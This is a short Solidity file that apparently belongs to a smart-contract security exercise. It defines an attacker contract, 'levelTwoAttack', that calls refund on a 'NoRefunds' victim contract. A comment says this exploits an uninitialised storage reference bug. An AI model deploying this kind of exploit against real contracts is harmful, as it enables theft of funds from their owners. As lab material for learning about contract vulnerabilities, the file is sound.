pragma solidity ^0.4.23;

import "./NoRefunds.sol";

// attack exploits an unintialised storage reference "bug" in the _victim contract
contract levelTwoAttack {
    NoRefunds public victim;
    constructor(address _victim) public {
        victim = NoRefunds(_victim);
    }
    function attack() external returns (bool) {
        victim.refund(false, 10000, msg.sender);
        return true;
    }
}
